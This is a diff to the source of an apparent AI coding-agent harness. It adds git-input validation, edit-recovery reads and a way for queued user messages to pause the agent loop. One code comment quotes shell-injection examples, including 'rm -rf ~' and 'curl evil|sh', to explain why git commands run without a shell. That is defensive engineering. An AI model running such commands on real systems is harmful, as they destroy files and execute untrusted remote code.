@@ -21,6 +21,7 @@ import {
   buildReadFileOutline,
 } from "../lib/read-file-page.js";
 import { ReadFileLoopGuard } from "../lib/read-file-loop-guard.js";
+import { gitToolInputError } from "../lib/git-tool-input.js";
 import { RemoteReadLoopGuard } from "../lib/remote-read-loop-guard.js";
 import {
   isPrActionRequest,
@@ -1114,6 +1115,7 @@ export function getBaseSystemPrompt(cwd) {
 You have access to tools that let you read files, write files, edit files, run shell commands, and search the codebase. When the user asks you to do something, USE THE TOOLS to actually do it — don't just describe what should be done.
 
 Key behaviors:
+- A new user message may arrive before the previous task finishes. Incorporate corrections and added requests while preserving unfinished authorized work, unless the user cancels or replaces it. Use the completed tool results already in history; do not restart the investigation.
 - When asked to modify code, read the file first, then edit it
 - When asked to create something, use write_file to create it
 - When asked to remove or rename a file, use delete_file or move_file so the filesystem intent is explicit and reviewable
@@ -5676,10 +5678,30 @@ async function executeToolInner(
           result.error === "ambiguous_anchor" && result.matches?.[0]
             ? snippetAround(original, result.matches[0].lineNumber - 1)
             : null;
+        const expectedContent = result.current ?? args.expected_line;
+        const expectedIndex =
+          typeof expectedContent === "string"
+            ? original
+                .split(/\r?\n/)
+                .findIndex((line) => line.trim() === expectedContent.trim())
+            : -1;
+        const recoveryRead = ["hash_mismatch", "content_mismatch"].includes(
+          result.error,
+        )
+          ? {
+              path: filePath,
+              hashed: true,
+              offset: Math.max(1, expectedIndex - 3 + 1),
+              limit: 80,
+            }
+          : null;
         return attachDescriptor({
           error: result.error,
           message: result.message,
-          hint: result.hint,
+          hint: recoveryRead
+            ? "Call read_file with the exact recoveryRead arguments (hashed:true) to refresh the anchors, then retry the edit using the returned hash. This bounded refresh is available once during loop recovery; do not restart broad reading."
+            : result.hint,
+          ...(recoveryRead && { recoveryRead }),
           ...(result.matches && { matches: result.matches }),
           ...(result.current && { current: result.current }),
           ...(result.expected && { expected: result.expected }),
@@ -6919,6 +6941,9 @@ async function executeToolInner(
         });
       }
 
+      const inputError = gitToolInputError(normalizedCommand);
+      if (inputError) return attachDescriptor(inputError);
+
       // Run via argv (spawnSync, NO shell) so shell metacharacters in the
       // command — e.g. `status; rm -rf ~`, `log && curl evil|sh`, `$(…)` —
       // cannot inject a second command. Previously execSync(`git ${cmd}`) ran
@@ -6965,6 +6990,7 @@ async function executeToolInner(
       }
       return attachDescriptor({
         stdout: String(res.stdout || "").substring(0, 30000),
+        exitCode: 0,
         command: normalizedCommand,
         readOnly,
       });
@@ -14282,6 +14308,17 @@ export async function* agentLoop(messages, options) {
   let lastTaskProgressIntervention = null;
 
   while (budget.hasRemaining()) {
+    // Yield only between complete tool batches. Keep all completed tool results
+    // and settle child usage before the host accepts queued user steering.
+    if (options.shouldYieldToUser?.() === true) {
+      await _awaitBackgroundUsageSettlement(
+        backgroundSubAgents,
+        backgroundUsageFailureState,
+      );
+      yield* _drainSubAgentUsage(subAgentUsageSink);
+      yield { type: "run-ended", runId, reason: "user-input-pending" };
+      return;
+    }
     readFileLoopGuard.finishBatch();
     if (remoteReadLoopGuard.stalled) {
       await _awaitBackgroundUsageSettlement(
@@ -14295,7 +14332,7 @@ export async function* agentLoop(messages, options) {
       error.code = "CC_AGENT_REPEATED_REMOTE_READ";
       throw error;
     }
-    if (readFileLoopGuard.stalled) {
+    if (readFileLoopGuard.stalled && !readFileLoopGuard.hasEditRecoveryReads) {
       await _awaitBackgroundUsageSettlement(
         backgroundSubAgents,
         backgroundUsageFailureState,
@@ -14906,7 +14943,9 @@ export async function* agentLoop(messages, options) {
       };
     }
     const pausedTools = new Set([
-      ...(readRecoveryTurn ? ["read_file"] : []),
+      ...(readRecoveryTurn && !readFileLoopGuard.hasEditRecoveryReads
+        ? ["read_file"]
+        : []),
       ...(taskRecoveryTurn ? taskRecoveryTools : []),
       ...remoteRecoveryTools,
       ...(prInvestigationExhausted
@@ -15793,8 +15832,16 @@ export async function* agentLoop(messages, options) {
       // Capability and exact-path authority must settle before any checkpoint,
       // hook, or observationally stronger `tool-executing` event. The same
       // preflight runs again inside executeTool to prevent call-site drift.
+      const editRecoveryRead =
+        toolName === "read_file" &&
+        typeof toolArgs?.path === "string" &&
+        readFileLoopGuard.canRecoverEdit(
+          path.resolve(toolContext.cwd || process.cwd(), toolArgs.path),
+          toolArgs,
+        );
       const earlyAuthorityDenial =
-        (pausedTools.has(toolName) ||
+        ((pausedTools.has(toolName) && !editRecoveryRead) ||
+        (readRecoveryTurn && toolName === "read_file" && !editRecoveryRead) ||
         remoteReadLoopGuard.shouldPause(toolName, toolArgs) ||
         (taskRecoveryTurn &&
           toolName === "read_file" &&
@@ -16170,6 +16217,8 @@ export async function* agentLoop(messages, options) {
         const resultStr = toolResultForModel(toolName, toolResult, messages);
         remoteReadLoopGuard.record(toolName, toolResult, toolArgs);
         explicitPrCloseActionGuard.record(toolName, toolArgs, toolResult);
+        if (toolName === "edit_file_hashed")
+          readFileLoopGuard.recordEditRecovery(toolResult);
         readFileLoopGuard.record(
           toolName,
           toolResult,
